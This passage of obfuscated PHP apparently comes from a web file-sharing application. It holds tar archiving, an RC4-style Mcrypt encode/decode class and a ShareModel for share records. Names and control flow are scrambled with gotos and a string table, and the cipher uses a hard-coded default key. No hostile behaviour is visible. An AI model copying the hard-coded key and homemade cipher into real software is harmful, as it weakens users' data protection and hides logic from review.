$E¨æ“ù¿¢); $Aê†ÏÊ‹… = Kodio::clear(get_path_father($E¨æ“ù¿¢)); if ($F¸ä©ë­æá == 0) { $aŒ±˜ç¶Ã = PclTarCreate($c–ÎÀÜÖö·, array($E¨æ“ù¿¢), $DïÚ„±áõ”, null, $Aê†ÏÊ‹…); continue; } $aŒ±˜ç¶Ã = PclTarAddList($c–ÎÀÜÖö·, array($E¨æ“ù¿¢), $AéÆÑÌ„[33], $Aê†ÏÊ‹…, $DïÚ„±áõ”); } } } return $aŒ±˜ç¶Ã; } } class Mcrypt { public static $defaultKey = "\141\41\x74\141\153\101\x3a\x64\154\x6d\143\154\144\105\166\x2c\145"; public static function encode($D‚ëàÁÆò», $d…†åç¦ô‡ = '', $e­’ÂÇ®†á = 0, $E´½¡ÇÖ¯œ = '') { goto A³­‰ßÅ­; bÖ±“Üìˆ™: $c£«šö÷ = $e®Ûè¸à©í[33]; for ($e¥êÜÛöìÜ = $B±Ì¶İÕ×˜ = $D—©Ë÷îˆ = 0; $D—©Ë÷îˆ < $d¤§²âš¾í; $D—©Ë÷îˆ++) { $e¥êÜÛöìÜ = ($e¥êÜÛöìÜ + 1) % 256; $B±Ì¶İÕ×˜ = ($B±Ì¶İÕ×˜ + $D‡—É¿ÌŒ£[$e¥êÜÛöìÜ]) % 256; $c±ÔÜ£ó»¶ = $D‡—É¿ÌŒ£[$e¥êÜÛöìÜ]; $D‡—É¿ÌŒ£[$e¥êÜÛöìÜ] = $D‡—É¿ÌŒ£[$B±Ì¶İÕ×˜]; $D‡—É¿ÌŒ£[$B±Ì¶İÕ×˜] = $c±ÔÜ£ó»¶; $c£«šö÷ .= chr(ord($D‚ëàÁÆò»[$D—©Ë÷îˆ]) ^ $D‡—É¿ÌŒ£[($D‡—É¿ÌŒ£[$e¥êÜÛöìÜ] + $D‡—É¿ÌŒ£[$B±Ì¶İÕ×˜]) % 256]); } $c£«šö÷ = $B£Íí–Œ˜… . str_replace($e®Ûè¸à©í[892], $e®Ûè¸à©í[33], base64_encode($c£«šö÷)); goto D á„¼¶¹Ø; A³­‰ßÅ­: $e®Ûè¸à©í =& $_SERVER[í™]; $dÆ‹¤Ê›³ˆ = 4; $d…†åç¦ô‡ = md5($d…†åç¦ô‡ ? $d…†åç¦ô‡ : self::$defaultKey); goto fÊì—‰ˆÍ; D á„¼¶¹Ø: $c£«šö÷ = str_replace(array($e®Ûè¸à©í[284], $e®Ûè¸à©í[8], $e®Ûè¸à©í[892]), array($e®Ûè¸à©í[412], $e®Ûè¸à©í[70], $e®Ûè¸à©í[91]), $c£«šö÷); return $c£«šö÷; goto fŞ÷·±É–¶; fÊì—‰ˆÍ: $d°áĞ‘Ä÷§ = md5(substr($d…†åç¦ô‡, 0, 16)); $Aóğ¤è•¯– = md5(substr($d…†åç¦ô‡, 16, 16)); $E´½¡ÇÖ¯œ = $E´½¡ÇÖ¯œ ? $E´½¡ÇÖ¯œ : md5(microtime()); goto e¡÷˜ÚñÎ•; bšÜ˜òô¯Ş: for ($D—©Ë÷îˆ = 0; $D—©Ë÷îˆ <= 255; $D—©Ë÷îˆ++) { $DÚùÊºæº‰[$D—©Ë÷îˆ] = ord($B‹Ê†İÚé[$D—©Ë÷îˆ % $f„Õ‚¬ÑòŸ]); } $D‡—É¿ÌŒ£ = range(0, 255); for ($B±Ì¶İÕ×˜ = $D—©Ë÷îˆ = 0; $D—©Ë÷îˆ < 256; $D—©Ë÷îˆ++) { $B±Ì¶İÕ×˜ = ($B±Ì¶İÕ×˜ + $D‡—É¿ÌŒ£[$D—©Ë÷îˆ] + $DÚùÊºæº‰[$D—©Ë÷îˆ]) % 256; $c±ÔÜ£ó»¶ = $D‡—É¿ÌŒ£[$D—©Ë÷îˆ]; $D‡—É¿ÌŒ£[$D—©Ë÷îˆ] = $D‡—É¿ÌŒ£[$B±Ì¶İÕ×˜]; $D‡—É¿ÌŒ£[$B±Ì¶İÕ×˜] = $c±ÔÜ£ó»¶; } goto bÖ±“Üìˆ™; e¡÷˜ÚñÎ•: $B£Íí–Œ˜… = substr($E´½¡ÇÖ¯œ, -$dÆ‹¤Ê›³ˆ); $B‹Ê†İÚé = $d°áĞ‘Ä÷§ . md5($d°áĞ‘Ä÷§ . $B£Íí–Œ˜…); $f„Õ‚¬ÑòŸ = strlen($B‹Ê†İÚé); goto Fµ±‰ê¸¯™; Fµ±‰ê¸¯™: $D‚ëàÁÆò» = sprintf($e®Ûè¸à©í[1920], $e­’ÂÇ®†á ? $e­’ÂÇ®†á + time() : 0) . substr(md5($D‚ëàÁÆò» . $Aóğ¤è•¯–), 0, 16) . $D‚ëàÁÆò»; $d¤§²âš¾í = strlen($D‚ëàÁÆò»); $DÚùÊºæº‰ = array(); goto bšÜ˜òô¯Ş; fŞ÷·±É–¶: } public static function decode($eÇáÕÙæ§, $e¯òÇ‡±¯¢ = '') { goto bâËĞ÷ñÉ½; e¤˜‹½Í’Ş: $E‹ƒïêº÷Ô = substr($eÇáÕÙæ§, 0, $EÙİŠâ·‚); $Fï³Âòîğ· = $C¨”¼É±Ğ¡ . md5($C¨”¼É±Ğ¡ . $E‹ƒïêº÷Ô); $c Ó­ã¶Ç = strlen($Fï³Âòîğ·); goto e¢…‘ØÒ¬Ü; D…ôœë®: if (($E¦–Õ¦Å¶Ñ == 0 || $E¦–Õ¦Å¶Ñ - time() > 0) && substr($Eø™âéó÷Û, 10, 16) == substr(md5(substr($Eø™âéó÷Û, 26) . $fÒ×™íÅ’Û), 0, 16)) { return substr($Eø™âéó÷Û, 26); } else { return $c¥™ï¯‹Ô[33]; } goto AİøÄ¿ÚŠ»; e¢…‘ØÒ¬Ü: $eÇáÕÙæ§ = base64_decode(substr($eÇáÕÙæ§, $EÙİŠâ·‚)); $F˜¨ß½®Ÿ¨ = strlen($eÇáÕÙæ§); $B—ó«§Œ†› = array(); goto Bë‡ØÈ‹…í; aÕËšÓ¡¼‰: $e¯òÇ‡±¯¢ = md5($e¯òÇ‡±¯¢ ? $e¯òÇ‡±¯¢ : self::$defaultKey); $C¨”¼É±Ğ¡ = md5(substr($e¯òÇ‡±¯¢, 0, 16)); $fÒ×™íÅ’Û = md5(substr($e¯òÇ‡±¯¢, 16, 16)); goto e¤˜‹½Í’Ş; bâËĞ÷ñÉ½: $c¥™ï¯‹Ô =& $_SERVER[í™]; $eÇáÕÙæ§ = str_replace(array($c¥™ï¯‹Ô[412], $c¥™ï¯‹Ô[70], $c¥™ï¯‹Ô[91]), array($c¥™ï¯‹Ô[284], $c¥™ï¯‹Ô[8], $c¥™ï¯‹Ô[892]), $eÇáÕÙæ§); $EÙİŠâ·‚ = 4; goto aÕËšÓ¡¼‰; c“¶¼³°ª¯: $Eø™âéó÷Û = $c¥™ï¯‹Ô[33]; for ($cö¯óƒÄ™¦ = $F¬»áó£¥» = $bÕÚ†—©¹¶ = 0; $bÕÚ†—©¹¶ < $F˜¨ß½®Ÿ¨; $bÕÚ†—©¹¶++) { $cö¯óƒÄ™¦ = ($cö¯óƒÄ™¦ + 1) % 256; $F¬»áó£¥» = ($F¬»áó£¥» + $eÎáÁ„Š‹‚[$cö¯óƒÄ™¦]) % 256; $bŠÜ¦ñ¯ = $eÎáÁ„Š‹‚[$cö¯óƒÄ™¦]; $eÎáÁ„Š‹‚[$cö¯óƒÄ™¦] = $eÎáÁ„Š‹‚[$F¬»áó£¥»]; $eÎáÁ„Š‹‚[$F¬»áó£¥»] = $bŠÜ¦ñ¯; $Eø™âéó÷Û .= chr(ord($eÇáÕÙæ§[$bÕÚ†—©¹¶]) ^ $eÎáÁ„Š‹‚[($eÎáÁ„Š‹‚[$cö¯óƒÄ™¦] + $eÎáÁ„Š‹‚[$F¬»áó£¥»]) % 256]); } $E¦–Õ¦Å¶Ñ = intval(substr($Eø™âéó÷Û, 0, 10)); goto D…ôœë®; Bë‡ØÈ‹…í: for ($bÕÚ†—©¹¶ = 0; $bÕÚ†—©¹¶ <= 255; $bÕÚ†—©¹¶++) { $B—ó«§Œ†›[$bÕÚ†—©¹¶] = ord($Fï³Âòîğ·[$bÕÚ†—©¹¶ % $c Ó­ã¶Ç]); } $eÎáÁ„Š‹‚ = range(0, 255); for ($F¬»áó£¥» = $bÕÚ†—©¹¶ = 0; $bÕÚ†—©¹¶ < 256; $bÕÚ†—©¹¶++) { $F¬»áó£¥» = ($F¬»áó£¥» + $eÎáÁ„Š‹‚[$bÕÚ†—©¹¶] + $B—ó«§Œ†›[$bÕÚ†—©¹¶]) % 256; $bŠÜ¦ñ¯ = $eÎáÁ„Š‹‚[$bÕÚ†—©¹¶]; $eÎáÁ„Š‹‚[$bÕÚ†—©¹¶] = $eÎáÁ„Š‹‚[$F¬»áó£¥»]; $eÎáÁ„Š‹‚[$F¬»áó£¥»] = $bŠÜ¦ñ¯; } goto c“¶¼³°ª¯; AİøÄ¿ÚŠ»: } } goto E¿‹À…†Œ´; d—¢—†§—™: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\151\155\145", "\164\151\155\x65", "\x69\156\163\x65\x72\164\54\x75\x70\x64\141\x74\x65", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\143\162\x65\x61\164\x65\x54\151\155\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\164", "\146\165\156\143\164\151\x6f\156"), array("\x6f\x70\x74\x69\x6f\x6e\163", '', "\151\156\163\145\162\x74\x2c\165\x70\x64\141\164\145\54\163\145\154\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($c­¢ÓÇ£Š) { $e§Šçæ =& $_SERVER[í™]; $E¢òØ˜ Üğ = isset($c­¢ÓÇ£Š[0]) ? $c­¢ÓÇ£Š[0] : !1; return array($e§Šçæ[2215] => array(USER_ID, $e§Šçæ[2216]), $e§Šçæ[2164] => array($E¢òØ˜ Üğ, $e§Šçæ[2217])); } protected function listSimple() { $aÇ«Ñ£ÉÑÍ = array($_SERVER[í™][1423] => USER_ID); $DÀæ¦¯Ïáè = $this->field($this->fieldList)->where($aÇ«Ñ£ÉÑÍ)->select(); return $DÀæ¦¯Ïáè ? $DÀæ¦¯Ïáè : array(); } protected function getInfo($cÖ³¼òŞÖ¾, $EÉÈÀ»”Ä = false) { $fë´ÍÎî =& $_SERVER[í™]; if ($EÉÈÀ»”Ä) { return $this->_getShareInfo(array($fë´ÍÎî[441] => $cÖ³¼òŞÖ¾)); } $e—ª„¸¶Ó = $this->cacheFunctionGet($fë´ÍÎî[2218], $cÖ³¼òŞÖ¾); return $e—ª„¸¶Ó; } public function getInfoByHash($A×˜¤ÉÉ¿Ü) { return $this->_getShareInfo(array($_SERVER[í™][443] => $A×˜¤ÉÉ¿Ü)); } public function getInfoByPath($E‚Â÷ˆ£) { $d‚µ£ë˜÷ =& $_SERVER[í™]; $aªÔ­ë­õÀ = array($d‚µ£ë˜÷[1423] => USER_ID, $d‚µ£ë˜÷[369] => $E‚Â÷ˆ£); return $this->_getShareInfo($aªÔ­ë­õÀ); } public function getInfoBySourcePath($e”Â•Ëã¬) { $C¯ÕïÓ´¤ =& $_SERVER[í™]; $C¿…ï³ç‰ = array($C¯ÕïÓ´¤[1423] => USER_ID, $C¯ÕïÓ´¤[1005] => $e”Â•Ëã¬); return $this->_getShareInfo($C¿…ï³ç‰); } private function _getShareInfo($C×ïĞ‡‰¬å) { goto d Æª¼¨ŒÛ; d Æª¼¨ŒÛ: $d™¹ñ¨ªš =& $_SERVER[í™]; $BºåØÅ˜ô‹ = $this->where($C×ïĞ‡‰¬å)->find(); if (!$BºåØÅ˜ô‹) { return !1; } goto B· í×­¡ì; B· í×­¡ì: $C×ïĞ‡‰¬å = array($d™¹ñ¨ªš[441] => $BºåØÅ˜ô‹[$d™¹ñ¨ªš[441]]); $f÷ùæƒ³¯› = $d™¹ñ¨ªš[2219]; $D†“ù¤°¼¬ = Model($d™¹ñ¨ªš[539])->order($d™¹ñ¨ªš[367])->field($f÷ùæƒ³¯›)->where($C×ïĞ‡‰¬å)->select(); goto d‰È±§‚ä; d‰È±§‚ä: if ($BºåØÅ˜ô‹[$d™¹ñ¨ªš[369]] == $d™¹ñ¨ªš[470]) { $BºåØÅ˜ô‹[$d™¹ñ¨ªš[391]] = IO::info($BºåØÅ˜ô‹[$d™¹ñ¨ªš[1005]]); } else { $BºåØÅ˜ô‹[$d™¹ñ¨ªš[391]] = Model($d™¹ñ¨ªš[1103])->pathInfo($BºåØÅ˜ô‹[$d™¹ñ¨ªš[369]]); } $BºåØÅ˜ô‹[$d™¹ñ¨ªš[2220]] = $D†“ù¤°¼¬; return $BºåØÅ˜ô‹; goto EŞÚëç¯Ä‘; EŞÚëç¯Ä‘: } protected function getInfoAuth($AÕÖÖÉĞ‹ô) { $eÉ‰†Ü¥ğ« =& $_SERVER[í™]; $DòÔº‰À = $this->getInfo($AÕÖÖÉĞ‹ô); $DòÔº‰À[$eÉ‰†Ü¥ğ«[376]] = Model($eÉ‰†Ü¥ğ«[456])->authMake($DòÔº‰À[$eÉ‰†Ü¥ğ«[2220]]); return $DòÔº‰À; } protected function listData($B¹‰±ß‰ñ¿ = null, $A”´ãœõ¯Ì = 300) { $cò¥‡“àï =& $_SERVER[í™]; $Bó˜Õ­³ËØ = array(array($cò¥‡“àï[446] => array($cò¥‡“àï[911], 0), $cò¥‡“àï[448] => array($cò¥‡“àï[911], 0), $cò¥‡“àï[2221] => $cò¥‡“àï[2178])); if ($B¹‰±ß‰ñ¿ == $cò¥‡“àï[1860]) { $Bó˜Õ­³ËØ = array($cò¥‡“àï[446] => 1); } else { if ($B¹‰±ß‰ñ¿ == $cò¥‡“àï[994]) { $Bó˜Õ­³ËØ = array($cò¥‡“àï[448] => 1); } } $Bó˜Õ­³ËØ[$cò¥‡“àï[1423]] = USER_ID; $BÒ©Úã´Ü = $this->where($Bó˜Õ­³ËØ)->selectPage($A”´ãœõ¯Ì); return $BÒ©Úã´Ü; } protected function listToMe($EÓÍù‹ÓŒ = 300) { goto e¿ª¹ù“ùÍ; eÃ—µÉƒ‰¤: $B“¸×ò¥Ò‚ = array($DÙîË¯ÒÇÕ[441] => array($DÙîË¯ÒÇÕ[384], array_keys($DÓ²Ø—ÕÄ))); $f¡œÆÅÃ…« = $this->field($AİãÜß©Õ)->where($B“¸×ò¥Ò‚)->select(); foreach ($f¡œÆÅÃ…« as $dÓƒİÂš—• => &$AùøöáÈÚó) { $AùøöáÈÚó[$DÙîË¯ÒÇÕ[2220]] = $DÓ²Ø—ÕÄ[$AùøöáÈÚó[$DÙîË¯ÒÇÕ[441]]]; } goto e¥ÎÂ„´ğ»; e¿ª¹ù“ùÍ: $DÙîË¯ÒÇÕ =& $_SERVER[í™]; $B¹Ñ¶òì÷Œ = Session::get($DÙîË¯ÒÇÕ[2222]); $eˆğôó¢ = array_to_keyvalue($B¹Ñ¶òì÷Œ, $DÙîË¯ÒÇÕ[33], $DÙîË¯ÒÇÕ[2094]); goto d‡Ñ®ì¹Ñ¨; d‡Ñ®ì¹Ñ¨: $B“¸×ò¥Ò‚ = array($DÙîË¯ÒÇÕ[523] => SourceModel::TYPE_USER, $DÙîË¯ÒÇÕ[458] => USER_ID); if ($eˆğôó¢) { $B“¸×ò¥Ò‚ = array(array($DÙîË¯ÒÇÕ[523] => SourceModel::TYPE_USER, $DÙîË¯ÒÇÕ[458] => USER_ID), array($DÙîË¯ÒÇÕ[523] => SourceModel::TYPE_GROUP, $DÙîË¯ÒÇÕ[458] => array($DÙîË¯ÒÇÕ[7], $eˆğôó¢)), $DÙîË¯ÒÇÕ[2221] => $DÙîË¯ÒÇÕ[2178]); } $D ‘ìµÙóÈ = Model($DÙîË¯ÒÇÕ[539])->where($B“¸×ò¥Ò‚)->selectPage($EÓÍù‹ÓŒ); goto fÒöì‚„öĞ; e¥ÎÂ„´ğ»: $C’îµÎ­™ = array($DÙîË¯ÒÇÕ[2224] => $f¡œÆÅÃ…«, $DÙîË¯ÒÇÕ[2225] => $D ‘ìµÙóÈ[$DÙîË¯ÒÇÕ[351]]); return $C’îµÎ­™; goto b™„¯»ğÈ‹; fÒöì‚„öĞ: $DÓ²Ø—ÕÄ = array_to_keyvalue_group($D ‘ìµÙóÈ[$DÙîË¯ÒÇÕ[354]], $DÙîË¯ÒÇÕ[441]); if (!$DÓ²Ø—ÕÄ) { return $D ‘ìµÙóÈ; } $AİãÜß©Õ = $DÙîË¯ÒÇÕ[2223]; goto eÃ—µÉƒ‰¤; b™„¯»ğÈ‹: } protected function shareAdd($D®Ü†ÑÓàœ, $E ÷çôª›ˆ) { $fíŒš±å¨ =& $_SERVER[í™]; $FƒÁ½Û¤¢ = $this->_addShareData($D®Ü†ÑÓàœ, $E ÷çôª›ˆ); if (!empty($E ÷çôª›ˆ[$fíŒš±å¨[2226]])) { $this->_shareAuthSet($FƒÁ½Û¤¢, $E ÷çôª›ˆ[$fíŒš±å¨[2226]]); } $this->shareEventAdd($D®Ü†ÑÓàœ, $E ÷çôª›ˆ, $fíŒš±å¨[997]); return $FƒÁ½Û¤¢; } private function shareEventAdd($B‰…¿¸œ©, $bÄŠäÃˆ ï, $C’Ãåï­¬ğ = "\141\x64\144") { goto dñÁÕ…‚‚Â; DÁğÊÇ©éŸ: return; goto Bóªøšğäº; dñÁÕ…‚‚Â: $D‰ªâ†¨µø =& $_SERVER[í™]; if ($C’Ãåï­¬ğ == $D‰ªâ†¨µø[997]) { if ($bÄŠäÃˆ ï[$D‰ªâ†¨µø[446]] == $D‰ªâ†¨µø[83]) { Model($D‰ªâ†¨µø[507])->eventShare($B‰…¿¸œ©, $D‰ªâ†¨µø[2227]); } if ($bÄŠäÃˆ ï[$D‰ªâ†¨µø[448]] == $D‰ªâ†¨µø[83]) { Model($D‰ªâ†¨µø[507])->eventShare($B‰…¿¸œ©, $D‰ªâ†¨µø[2228]); } return; } $aÕ·±à ¸° = $this->getInfoByPath($B‰…¿¸œ©); goto Bé›Ø†Ã®â; a¢æí¨ÈÂ³: if ($aÕ·±à ¸°[$D‰ªâ†¨µø[448]] == $D‰ªâ†¨µø[470] && $bÄŠäÃˆ ï[$D‰ªâ†¨µø[448]] == $D‰ªâ†¨µø[83]) { $a’­Ş•øŞµ = $D‰ªâ†¨µø[2228]; } if ($aÕ·±à ¸°[$D‰ªâ†¨µø[448]] == $D‰ªâ†¨µø[83] && $bÄŠäÃˆ ï[$D‰ªâ†¨µø[448]] == $D‰ªâ†¨µø[470]) { $a’­Ş•øŞµ = $D‰ªâ†¨µø[2231]; } Model($D‰ªâ†¨µø[507])->eventShare($B‰…¿¸œ©, $a’­Ş•øŞµ); goto DÁğÊÇ©éŸ; Bé›Ø†Ã®â: $a’­Ş•øŞµ = $D‰ªâ†¨µø[2229]; if ($aÕ·±à ¸°[$D‰ªâ†¨µø[446]] == $D‰ªâ†¨µø[470] && $bÄŠäÃˆ ï[$D‰ªâ†¨µø[446]] == $D‰ªâ†¨µø[83]) { $a’­Ş•øŞµ = $D‰ªâ†¨µø[2227]; } if ($aÕ·±à ¸°[$D‰ªâ†¨µø[446]] == $D‰ªâ†¨µø[83] && $bÄŠäÃˆ ï[$D‰ªâ†¨µø[446]] == $D‰ªâ†¨µø[470]) { $a’­Ş•øŞµ = $D‰ªâ†¨µø[2230]; } goto a¢æí¨ÈÂ³; Bóªøšğäº: } private function _addShareData($aÆØÜİ÷öÖ, $cñõ‡òÅ‚ = array()) { goto E¹ß…àêÚ; e×ŒÓ”¡ÂÆ: if ($DÂÔ˜ğæ = $this->where($AÎÍ’ÂÍ´–)->find()) { return $DÂÔ˜ğæ[$A œ¹•¼¬[441]]; } if ($aÆØÜİ÷öÖ == 0) { $fÙÉ³ÀØªø = array($A œ¹•¼¬[28] => get_path_this($cñõ‡òÅ‚[$A œ¹•¼¬[75]])); } else { $fÙÉ³ÀØªø = Model($A œ¹•¼¬[734])->sourceInfo($aÆØÜİ÷öÖ); if (!$fÙÉ³ÀØªø) { return !1; } } if (!$cñõ‡òÅ‚[$A œ¹•¼¬[1328]]) { $cñõ‡òÅ‚[$A œ¹•¼¬[1328]] = $fÙÉ³ÀØªø[$A œ¹•¼¬[28]]; } goto f¥¿ë‚¬š¸; f¥¿ë‚¬š¸: $eÓë¶ó°À÷ = array($A œ¹•¼¬[1414] => USER_ID, $A œ¹•¼¬[383] => $aÆØÜİ÷öÖ, $A œ¹•¼¬[1328] => $A œ¹•¼¬[33], $A œ¹•¼¬[446] => 0, $A œ¹•¼¬[448] => 0, $A œ¹•¼¬[1005] => $A œ¹•¼¬[33], $A œ¹•¼¬[295] => $A œ¹•¼¬[33], $A œ¹•¼¬[787] => $A œ¹•¼¬[33], $A œ¹•¼¬[2233] => 0, $A œ¹•¼¬[2234] => 0, $A œ¹•¼¬[449] => 0, $A œ¹•¼¬[450] => $A œ¹•¼¬[33], $A œ¹•¼¬[443] => $A œ¹•¼¬[33]); $FŸ·¶÷«Ÿ = explode($A œ¹•¼¬[47], $A œ¹•¼¬[2235]); foreach ($FŸ·¶÷«Ÿ as $DöŠãçâ®) { if (!isset($cñõ‡òÅ‚[$DöŠãçâ®])) { continue; } $eÓë¶ó°À÷[$DöŠãçâ®] = $cñõ‡òÅ‚[$DöŠãçâ®]; } goto Dø­Ñ¿å„‡; cÉ×èÀà–: return $Càæğ£¨›; goto f‰£š¼ÀÉÀ; Dø­Ñ¿å„‡: $Càæğ£¨› = $this->add($eÓë¶ó°À÷); $F“ÎÚÎ¶‰ = array($A œ¹•¼¬[443] => short_id($Càæğ£¨›)); $this->where(array($A œ¹•¼¬[440] => $Càæğ£¨›))->save($F“ÎÚÎ¶‰); goto cÉ×èÀà–; E¹ß…àêÚ: $A œ¹•¼¬ =& $_SERVER[í™]; $AÎÍ’ÂÍ´– = array($A œ¹•¼¬[383] => $aÆØÜİ÷öÖ, $A œ¹•¼¬[1414] => USER_ID); if ($aÆØÜİ÷öÖ == 0) { $AÎÍ’ÂÍ´– = array($A œ¹•¼¬[2232] => $cñõ‡òÅ‚[$A œ¹•¼¬[1005]], $A œ¹•¼¬[1414] => USER_ID); } goto e×ŒÓ”¡ÂÆ; f‰£š¼ÀÉÀ: } private function _shareAuthSet($Dİêñ¯·Û‰, $DŠÂ­‘›õÀ) { goto Bí²Š­åÔ¬; eÚ¨Œªì’: return $eöšøÛ Õâ->addAll($bŞ§Şë±ï†, array(), !0); goto C±ù¯¯¨ä÷; d†¹ã“ê: $eöšøÛ Õâ->where(array($CŠµ”°×[441] => $Dİêñ¯·Û‰))->delete(); $bŞ§Şë±ï† = array(); foreach ($DŠÂ­‘›õÀ as $Bùºö³°´Å) { $eê°„“··Œ = SourceModel::TYPE_USER; if ($Bùºö³°´Å[$CŠµ”°×[371]] == SourceModel::TYPE_GROUP) { $eê°„“··Œ = SourceModel::TYPE_GROUP; } $fÒÇŠã·éŠ = array($CŠµ”°×[441] => $Dİêñ¯·Û‰, $CŠµ”°×[371] => $eê°„“··Œ, $CŠµ”°×[458] => intval($Bùºö³°´Å[$CŠµ”°×[458]]), $CŠµ”°×[2237] => 0, $CŠµ”°×[2238] => -1); if ($Bùºö³°´Å[$CŠµ”°×[2237]]) { $fÒÇŠã·éŠ[$CŠµ”°×[2237]] = $Bùºö³°´Å[$CŠµ”°×[2237]]; } else { if ($Bùºö³°´Å[$CŠµ”°×[2238]]) { $fÒÇŠã·éŠ[$CŠµ”°×[2238]] = $Bùºö³°´Å[$CŠµ”°×[2238]]; } } $bŞ§Şë±ï†[] = $fÒÇŠã·éŠ; } goto eÚ¨Œªì’; Bí²Š­åÔ¬: $CŠµ”°× =& $_SERVER[í™]; if (!is_array($DŠÂ­‘›õÀ)) { return !1; } $eöšøÛ Õâ = Model($CŠµ”°×[2236]); goto d†¹ã“ê; C±ù¯¯¨ä÷: } public function numViewAdd($Dƒºê¾å¿•) { $CŞíÖÆàç =& $_SERVER[í™]; $EŞ£ÜƒğÃ‹ = array($CŞíÖÆàç[440] => $Dƒºê¾å¿•); $this->where($EŞ£ÜƒğÃ‹)->setAdd($CŞíÖÆàç[2233]); } public function numDownloadAdd($Dùñ×‘–½) { $c½”¢Ù¤§• =& $_SERVER[í™]; $cÏæ­¯¯ÕË = array($c½”¢Ù¤§•[440] => $Dùñ×‘–½); $this->where($cÏæ­¯¯ÕË)->setAdd($c½”¢Ù¤§•[2234]); } protected function shareEdit($aÂ÷Ìª²ë‡, $eá®Å½÷ˆ¬) { goto AéÓ˜­Í×; e—‘Ê”‰ô: if (isset($eá®Å½÷ˆ¬[$eÓ–´‹¡˜‹[2226]])) { $this->_shareAuthSet($aÂ÷Ìª²ë‡, $eá®Å½÷ˆ¬[$eÓ–´‹¡˜‹[2226]]); } return !0; goto Bèóğóçç; AéÓ˜­Í×: $eÓ–´‹¡˜‹ =& $_SERVER[í™]; $B¸Ò…÷É÷ = $this->getInfo($aÂ÷Ìª²ë‡); if (!$B¸Ò…÷É÷) { return !1; } goto D±£İˆ•ó; cÆõéÁ‹¦˜: foreach ($d®–ÏŠğè™ as $FºøùÈÒ¶) { if (!array_key_exists($FºøùÈÒ¶, $eá®Å½÷ˆ¬)) { continue; } $a¹æÂÅ±»[$FºøùÈÒ¶] = $eá®Å½÷ˆ¬[$FºøùÈÒ¶]; } $this->shareEventAdd($B¸Ò…÷É÷[$eÓ–´‹¡˜‹[369]], $eá®Å½÷ˆ¬, $eÓ–´‹¡˜‹[2061]); $this->where(array($eÓ–´‹¡˜‹[440] => $aÂ÷Ìª²ë‡))->save($a¹æÂÅ±»); goto e—‘Ê”‰ô; D±£İˆ•ó: $this->_checkLinkShare($eá®Å½÷ˆ¬, $B¸Ò…÷É÷); $a¹æÂÅ±» = array(); $d®–ÏŠğè™ = explode($eÓ–´‹¡˜‹[47], $eÓ–´‹¡˜‹[2239]); goto cÆõéÁ‹¦˜; Bèóğóçç: } private function _checkLinkShare($B¹ÏÛ…Á±®, $B¶Î¦«¨Úê) { goto EÍø¨¸…«²; D˜àğ†Å­: $bïÈ£ÛÀÕ’ = $this->shareFileMeta($aèß»óìâî[$Aï÷ÙÄ›íÈ[419]]); if (isset($bïÈ£ÛÀÕ’[$Aï÷ÙÄ›íÈ[359]]) && $bïÈ£ÛÀÕ’[$Aï÷ÙÄ›íÈ[359]] == $Aï÷ÙÄ›íÈ[83]) { show_json(LNG($Aï÷ÙÄ›íÈ[2242]), !1); } goto dÛ­„çâš³; a×—îñØ×“: if ($B¶Î¦«¨Úê[$Aï÷ÙÄ›íÈ[391]][$Aï÷ÙÄ›íÈ[29]] != $Aï÷ÙÄ›íÈ[167]) { $bé”ÔªÎ‡Ô = $this->_folderReport($eí‘Ú¹È³ê); if (!$bé”ÔªÎ‡Ô) { return; } show_json(LNG($Aï÷ÙÄ›íÈ[2240]) . $Aï÷ÙÄ›íÈ[2241] . $bé”ÔªÎ‡Ô, !1); } $aèß»óìâî = Model($Aï÷ÙÄ›íÈ[734])->fileInfoGet($B¶Î¦«¨Úê[$Aï÷ÙÄ›íÈ[391]][$Aï÷ÙÄ›íÈ[369]]); if (!$aèß»óìâî) { return; } goto D˜àğ†Å­; EÍø¨¸…«²: $Aï÷ÙÄ›íÈ =& $_SERVER[í™]; if ($B¹ÏÛ…Á±®[$Aï÷ÙÄ›íÈ[446]] != $Aï÷ÙÄ›íÈ[83]) { return; } $eí‘Ú¹È³ê = $B¶Î¦«¨Úê[$Aï÷ÙÄ›íÈ[391]][$Aï÷ÙÄ›íÈ[369]]; goto a×—îñØ×“; dÛ­„çâš³: } private function _folderReport($B­¯¿ñ§ÏĞ) { goto cõÎáŞ’áÄ; F¸ºö’äœÈ: $cß¡ğó°´ = array($bÛ¼ˆº‰¦[419] => array($bÛ¼ˆº‰¦[7], $A«á¿×ˆÄù), $bÛ¼ˆº‰¦[461] => array($bÛ¼ˆº‰¦[733], "\x25{$DöÔ¨ĞƒÊ¸}\45"), $bÛ¼ˆº‰¦[397] => 0); $Dí¹½ÖŠâİ = Model($bÛ¼ˆº‰¦[734])->where($cß¡ğó°´)->field($bÛ¼ˆº‰¦[2244])->find(); if (!$Dí¹½ÖŠâİ) { return !1; } goto cÄ˜áó„; B’Ìò‰ä: $BŠÃ†¡²ˆ = array_to_keyvalue($a¸åçŸÖß, $bÛ¼ˆº‰¦[33], $bÛ¼ˆº‰¦[28]); $BŠÃ†¡²ˆ[] = $Dí¹½ÖŠâİ[$bÛ¼ˆº‰¦[28]]; return implode($bÛ¼ˆº‰¦[8], $BŠÃ†¡²ˆ); goto CÊø‰ƒøî–; B‰ ÚÒÒ©˜: if (!$A«á¿×ˆÄù) { return !1; } $A«á¿×ˆÄù = array_to_keyvalue($A«á¿×ˆÄù, $bÛ¼ˆº‰¦[33], $bÛ¼ˆº‰¦[419]); $DöÔ¨ĞƒÊ¸ = $bÛ¼ˆº‰¦[47] . $B­¯¿ñ§ÏĞ . $bÛ¼ˆº‰¦[47]; goto F¸ºö’äœÈ; cÄ˜áó„: $bÀŠÎäÓ”« = substr($Dí¹½ÖŠâİ[$bÛ¼ˆº‰¦[461]], strpos($Dí¹½ÖŠâİ[$bÛ¼ˆº‰¦[461]], $DöÔ¨ĞƒÊ¸)); $cß¡ğó°´ = array($bÛ¼ˆº‰¦[369] => array($bÛ¼ˆº‰¦[7], trim($bÀŠÎäÓ”«, $bÛ¼ˆº‰¦[47]))); $a¸åçŸÖß = Model($bÛ¼ˆº‰¦[734])->where($cß¡ğó°´)->field($bÛ¼ˆº‰¦[28])->select(); goto B’Ìò‰ä; cõÎáŞ’áÄ: $bÛ¼ˆº‰¦ =& $_SERVER[í™]; $cß¡ğó°´ = array($bÛ¼ˆº‰¦[419] => 